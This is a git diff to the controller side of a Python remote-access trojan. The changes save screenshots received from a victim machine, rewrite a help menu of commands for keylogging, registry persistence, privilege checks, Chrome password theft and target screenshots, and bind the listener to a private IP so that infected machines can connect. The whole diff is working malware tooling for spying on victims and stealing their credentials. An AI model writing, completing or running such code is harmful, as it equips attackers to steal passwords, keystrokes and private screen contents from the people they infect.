@@ -67,6 +67,8 @@ def target_communication():
                     break
             target.settimeout(None)
             f.close()
+            os.rename('screenshot0', 'screenshot.jpg')
+            print("screenshot saved as screenshot.jpg")
             count += 1
         elif command == 'help':
 	            print(termcolor.colored('''\n
@@ -79,10 +81,9 @@ def target_communication():
                 keylog_dump                         --> Print Keystrokes That The Target Inputted
                 keylog_stop                         --> Stop And Self Destruct Keylogger File
                 persistence *RegName* *fileName*    --> Create Persistence In Registry
-		screenshot                          --> screenshoot the target's PC
-		grabchrome                          --> grab chrome passwords
-		checkpriv                           --> check for admin privilege
-		''', 'green'))
+		checkpriv                           --> check admin privilege
+		chromegrab                          --> grab chrome passwords
+		screenshot                          --> get target screenshot''', 'green'))
         else:
             result = reliable_recv()
             print(result)
@@ -100,10 +101,11 @@ print("""
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('ip address', 5555))
+sock.bind(('192.168.10.116', 5555))
 print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
 print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
 print(termcolor.colored("'help' for options", 'green'))
 target_communication()
+
